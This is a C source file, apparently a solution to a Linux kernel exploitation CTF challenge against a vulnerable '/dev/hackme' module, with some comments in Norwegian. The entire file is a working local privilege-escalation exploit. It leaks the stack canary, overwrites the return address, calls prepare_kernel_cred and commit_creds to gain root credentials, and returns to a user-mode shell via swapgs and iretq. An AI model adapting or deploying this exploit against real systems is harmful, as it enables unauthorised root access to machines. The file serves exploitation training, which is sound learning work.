// https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#smepsmap

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

int FD;
ssize_t cookie;
int cookie_offset;

void shell_to_user() {
    unsigned int uid = getuid();
    printf("[*] UID: %d\n", uid);
    // execve("/bin/sh\0", NULL, NULL);
    system("/bin/sh");
    puts("HEII");
}

ssize_t prepare_kernel_cred = 0xffffffff814c67f0;
ssize_t commit_creds = 0xffffffff814c6410;
ssize_t shell_addr = (ssize_t) shell_to_user;
ssize_t user_cs, user_ss, user_rflags, user_sp;

void open_module() {
    FD = open("/dev/hackme", O_RDWR);
    if (FD < 0) {
        printf("[!] Failed to open %s\n", "/dev/hackme");
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", "/dev/hackme");
    }
}

void leak_64bit() {
    int n = 20;
    ssize_t leak[n];

    ssize_t data = read(FD, leak, sizeof(leak));
   

    for (int i = 0; i < n; i++) {
        char leak_str[18];
        sprintf(leak_str, "%#lx", leak[i]); // # prepends 0x
        leak_str[18] = '\0';
        if (strncmp(leak_str, "0xffff", 6) && (strstr(leak_str, "00") - leak_str) == 16) {
            cookie_offset = i;
            cookie = leak[i];
            printf("[+] Potential canary found at base + 0x%x\t: %s\n", sizeof(leak[0]) * cookie_offset, leak_str);
        }
        // printf("%d: leak + 0x%x\t: %s\n", i, sizeof(leak[0]) * i, leak_str);
    }
}

void save_state() {
    asm(".intel_syntax noprefix");
    asm("mov user_cs, cs");
    asm("mov user_ss, ss");
    asm("mov user_sp, rsp");
    asm("pushf");
    asm("pop user_rflags");
    asm(".att_syntax");
    puts("[+] Saved state");
}

void privesc() {
    asm(".intel_syntax noprefix");
    asm("movabs rax, prepare_kernel_cred"); 
    asm("xor rdi, rdi");     // 0 som første arg til prepare_kernel_cred
    asm("call rax");
    asm("mov rdi, rax");
    asm("movabs rax, commit_creds"); // commit_creds med ret fra prepare_kernel_cred som arg1
    asm("call rax");
    asm("swapgs"); // swapgs først for å starte switch til user mode
    asm("mov r15, user_ss"); // lag fake saved state på stack for å vite hvor vi skal fortsette
    asm("push r15");
    asm("mov r15, user_sp");
    asm("push r15");
    asm("mov r15, user_rflags");
    asm("push r15");
    asm("mov r15, user_cs");
    asm("push r15");
    asm("mov r15, shell_addr"); // nye rip
    asm("push r15");
    asm("iretq"); // iretq for å laste nytt state med ny rip 
    asm(".att_syntax");
}

void rop() {
    int n = 50;
    ssize_t payload[n];
    payload[cookie_offset++] = cookie;
    payload[cookie_offset++] = 0x1111111111111111;
    payload[cookie_offset++] = 0x2222222222222222;
    payload[cookie_offset++] = 0x3333333333333333;
    payload[cookie_offset++] = (ssize_t) privesc;

    write(FD, payload, sizeof(payload));
}

int main(int argc, char** argv) {
    open_module();
    leak_64bit();
    save_state();
    rop();
}